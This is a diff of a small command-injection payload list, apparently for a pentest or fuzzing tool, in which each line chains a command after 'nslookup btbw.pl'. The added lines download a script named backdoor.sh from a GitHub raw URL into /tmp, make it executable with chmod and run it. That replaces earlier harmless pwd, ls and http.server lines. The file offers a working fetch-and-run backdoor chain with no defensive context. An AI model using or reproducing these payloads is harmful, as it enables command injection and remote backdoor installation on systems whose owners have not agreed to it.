@@ -1,11 +1,11 @@
 
 
-btbw.pl && pwd
+nslookup btbw.pl && pwd
 
-btbw.pl && ls
+nslookup btbw.pl && ls
 
-btbw.pl && curl -LOk {URL}
+nslookup btbw.pl && curl -o /tmp/backdoor.sh -LOk https://raw.githubusercontent.com/szalek/bash_backdoor_1/master/backdoor.sh && echo 1
 
-btbw.pl && apt-get install -y python3 
+nslookup btbw.pl & chmod +x /tmp/backdoor.sh
 
-btbw.pl && python3 -m http.server 70
+nslookup btbw.pl & /tmp/backdoor.sh
